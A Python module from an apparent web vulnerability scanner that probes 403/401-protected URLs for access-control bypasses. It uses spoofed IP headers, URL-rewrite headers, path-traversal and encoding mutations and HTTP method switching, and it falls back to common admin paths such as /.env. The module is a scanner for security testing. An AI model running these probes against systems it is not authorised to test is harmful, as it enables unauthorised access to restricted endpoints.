"""
cyberm4fia-scanner - 403/401 Forbidden Bypass Scanner
Detects misconfigured access controls using 100+ header, URL path, method,
and protocol-level bypass techniques.
Based on Az0x7/vulnerability-Checklist and real-world bug bounty research.
"""

from urllib.parse import urlparse, urlunparse

from utils.colors import log_info, log_success
from utils.request import smart_request, ScanExceptions

# ─────────────────────────────────────────────────────
# Bypass Headers — IP spoofing & URL rewriting
# ─────────────────────────────────────────────────────
BYPASS_HEADERS_IP = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-Host", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Real-Ip", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Original-Remote-Addr", "127.0.0.1"),
    ("X-True-IP", "127.0.0.1"),
    ("X-Host", "127.0.0.1"),
    ("X-Forwarded-By", "127.0.0.1"),
    ("X-Forwarder-For", "127.0.0.1"),
    ("X-Forwarded-Server", "127.0.0.1"),
    ("X-Forwarded", "127.0.0.1"),
    ("X-Http-Host-Override", "127.0.0.1"),
    ("X-Http-Destinationurl", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-For-Original", "127.0.0.1"),
    ("X-Forwarded-For", "http://127.0.0.1"),
    ("X-Forwarded-For", "127.0.0.1:80"),
    ("Client-IP", "127.0.0.1"),
    ("Real-Ip", "127.0.0.1"),
    ("Proxy-Host", "127.0.0.1"),
    ("Proxy-Url", "127.0.0.1"),
    ("Referer", "127.0.0.1"),
    ("Referrer", "127.0.0.1"),
]

BYPASS_HEADERS_URL = [
    ("X-Original-Url", None),        # Will be filled with target path
    ("X-Rewrite-Url", None),         # Will be filled with target path
    ("X-Forwarded-Scheme", "http"),
    ("X-Forwarded-Scheme", "https"),
    ("X-Forwarded-Port", "443"),
    ("X-Forwarded-Port", "80"),
    ("X-Forwarded-Port", "8080"),
    ("X-Forwarded-Port", "4443"),
    ("X-Forwarded-Port", "8443"),
]

# ─────────────────────────────────────────────────────
# URL Path Mutations (most effective subset of 200+)
# ─────────────────────────────────────────────────────
PATH_MUTATIONS = [
    # Trailing characters
    "{path}/", "{path}//", "{path}/.", "{path}/..",
    "{path}..;/", "{path};/", "{path}%20", "{path}%09",
    "{path}%00", "{path}?", "{path}#", "{path}?;",
    "{path}/*",
    # Prefix mutations
    "/{path}", "//{path}", "/./{path}", "/.;/{path}",
    # Path traversal tricks
    "/{path}/..;/", "/{path}/../{last}", "/{path}/%2e%2e/{last}",
    # Encoding bypasses
    "/{path}%2f", "/%2e/{path}", "/%2f/{path}", "/{path}%23",
    "/{path}%3f", "/{path}%252f",
    # Double-URL encoding
    "/%252e%252e/{path}", "/%252e/{path}",
    # Extension tricks
    "{path}.html", "{path}.json", "{path}.css",
    "{path}.php", "{path}.js",
    # Null byte / special chars
    "{path}%00.json", "{path}%0d%0a",
    # Case manipulation
    None,  # sentinel — handled in code
]

# ─────────────────────────────────────────────────────
# HTTP Methods for method switching
# ─────────────────────────────────────────────────────
HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS",
                "HEAD", "TRACE", "CONNECT"]


def _get_baseline(url, delay=0):
    """Get baseline response status for the URL."""
    try:
        resp = smart_request("get", url, delay=delay, timeout=5)
        return resp.status_code
    except ScanExceptions:
        return None


def _test_header_bypass(url, path, delay=0):
    """Test 403 bypass via IP spoofing and URL rewrite headers."""
    findings = []

    # IP spoofing headers
    for header_name, header_value in BYPASS_HEADERS_IP:
        try:
            resp = smart_request(
                "get", url, delay=delay, timeout=5,
                headers={header_name: header_value},
            )
            if resp.status_code == 200:
                findings.append({
                    "type": "403 Bypass",
                    "vuln": "Header IP Spoofing",
                    "header": f"{header_name}: {header_value}",
                    "severity": "HIGH",
                    "description": f"Access bypass via {header_name}: {header_value}",
                    "url": url,
                })
                log_success(f"🔓 403 bypass! {header_name}: {header_value}")
                return findings
        except ScanExceptions:
            pass

    # URL rewrite headers
    for header_name, header_value in BYPASS_HEADERS_URL:
        value = header_value if header_value else path
        try:
            # For X-Original-Url / X-Rewrite-Url, request root with header
            parsed = urlparse(url)
            root_url = urlunparse(parsed._replace(path="/"))
            resp = smart_request(
                "get", root_url, delay=delay, timeout=5,
                headers={header_name: value},
            )
            if resp.status_code == 200:
                findings.append({
                    "type": "403 Bypass",
                    "vuln": "URL Rewrite Header",
                    "header": f"{header_name}: {value}",
                    "severity": "HIGH",
                    "description": f"Access bypass via {header_name}: {value}",
                    "url": url,
                })
                log_success(f"🔓 403 bypass! {header_name}: {value}")
                return findings
        except ScanExceptions:
            pass

    return findings


def _test_path_bypass(url, delay=0):
    """Test 403 bypass via URL path mutations."""
    findings = []
    parsed = urlparse(url)
    path = parsed.path.strip("/")
    last_segment = path.split("/")[-1] if "/" in path else path

    # Case manipulation variants
    if any(c.isalpha() for c in path):
        case_variants = []
        for i in range(min(len(last_segment), 6)):
            variant = list(last_segment)
            variant[i] = variant[i].swapcase()
            case_variants.append("".join(variant))

        for variant in case_variants[:4]:
            new_path = parsed.path.replace(last_segment, variant)
            try:
                test_url = urlunparse(parsed._replace(path=new_path))
                resp = smart_request("get", test_url, delay=delay, timeout=5)
                if resp.status_code == 200:
                    findings.append({
                        "type": "403 Bypass",
                        "vuln": "Case Manipulation",
                        "payload": new_path,
                        "severity": "MEDIUM",
                        "description": f"Access via case variant: {new_path}",
                        "url": url,
                    })
                    log_success(f"🔓 403 bypass! Case: {new_path}")
                    return findings
            except ScanExceptions:
                pass

    # Template-based path mutations
    for template in PATH_MUTATIONS:
        if template is None:
            continue
        mutated = template.replace("{path}", path).replace("{last}", last_segment)
        if not mutated.startswith("/"):
            mutated = "/" + mutated
        try:
            test_url = urlunparse(parsed._replace(path=mutated))
            resp = smart_request("get", test_url, delay=delay, timeout=5)
            if resp.status_code == 200:
                findings.append({
                    "type": "403 Bypass",
                    "vuln": "Path Mutation",
                    "payload": mutated,
                    "severity": "HIGH",
                    "description": f"Access bypass via path: {mutated}",
                    "url": url,
                })
                log_success(f"🔓 403 bypass! Path: {mutated}")
                return findings
        except ScanExceptions:
            pass

    return findings


def _test_method_bypass(url, delay=0):
    """Test 403 bypass via HTTP method switching."""
    findings = []

    for method in HTTP_METHODS:
        if method == "GET":
            continue
        try:
            resp = smart_request(method.lower(), url, delay=delay, timeout=5)
            if resp.status_code == 200:
                findings.append({
                    "type": "403 Bypass",
                    "vuln": "Method Switch",
                    "payload": method,
                    "severity": "HIGH",
                    "description": f"Access bypass via {method} method",
                    "url": url,
                })
                log_success(f"🔓 403 bypass! Method: {method}")
                return findings
        except ScanExceptions:
            pass

    # POST + Content-Length: 0 — bypasses some auth filters (Spring, Tomcat)
    try:
        resp = smart_request(
            "post", url, delay=delay, timeout=5,
            headers={"Content-Length": "0"},
        )
        if resp.status_code == 200:
            findings.append({
                "type": "403 Bypass",
                "vuln": "Method Switch",
                "payload": "POST + Content-Length: 0",
                "severity": "HIGH",
                "description": "Access bypass via POST with Content-Length: 0",
                "url": url,
            })
            log_success("🔓 403 bypass! POST + Content-Length: 0")
    except ScanExceptions:
        pass

    return findings


def _test_protocol_bypass(url, delay=0):
    """Test 403 bypass via HTTP/1.0 downgrade."""
    findings = []
    try:
        resp = smart_request(
            "get", url, delay=delay, timeout=5,
            headers={"Connection": "close"},
        )
        if resp.status_code == 200:
            findings.append({
                "type": "403 Bypass",
                "vuln": "Protocol Downgrade",
                "severity": "MEDIUM",
                "description": "Access bypass via protocol manipulation",
                "url": url,
            })
            log_success("🔓 403 bypass! Protocol downgrade")
    except ScanExceptions:
        pass
    return findings


def scan_forbidden_bypass(url, pages=None, delay=0):
    """
    Main 403/401 bypass scanner entry point.
    Tests the given URL and discovered 403/401 pages for access bypass.
    """
    log_info("Starting 403/401 Bypass Scanner...")
    all_findings = []
    pages = pages or []

    # Collect URLs that returned 403/401
    target_urls = []
    baseline_status = _get_baseline(url, delay)
    if baseline_status in (401, 403):
        target_urls.append(url)

    # Also scan discovered pages that returned 403/401
    for page in pages[:20]:
        page_url = page if isinstance(page, str) else page.get("url", "")
        if page_url:
            status = _get_baseline(page_url, delay)
            if status in (401, 403):
                target_urls.append(page_url)

    if not target_urls:
        log_info("No 403/401 pages found to test. Trying common admin paths...")
        parsed = urlparse(url)
        common_paths = [
            "/admin", "/admin/", "/manager", "/dashboard",
            "/config", "/settings", "/api/admin", "/internal",
            "/.env", "/server-status", "/server-info",
        ]
        for path in common_paths:
            test_url = urlunparse(parsed._replace(path=path))
            status = _get_baseline(test_url, delay)
            if status in (401, 403):
                target_urls.append(test_url)

    log_info(f"Found {len(target_urls)} forbidden endpoint(s) to test")

    for target_url in target_urls[:10]:
        parsed = urlparse(target_url)
        path = parsed.path

        log_info(f"  → Testing bypass on: {path}")

        # Test all bypass categories
        header_results = _test_header_bypass(target_url, path, delay)
        all_findings.extend(header_results)
        if header_results:
            continue

        path_results = _test_path_bypass(target_url, delay)
        all_findings.extend(path_results)
        if path_results:
            continue

        method_results = _test_method_bypass(target_url, delay)
        all_findings.extend(method_results)
        if method_results:
            continue

        all_findings.extend(_test_protocol_bypass(target_url, delay))

    if not all_findings:
        log_info("No 403/401 bypass found.")

    log_success(f"403/401 bypass scan complete. {len(all_findings)} finding(s).")
    return all_findings
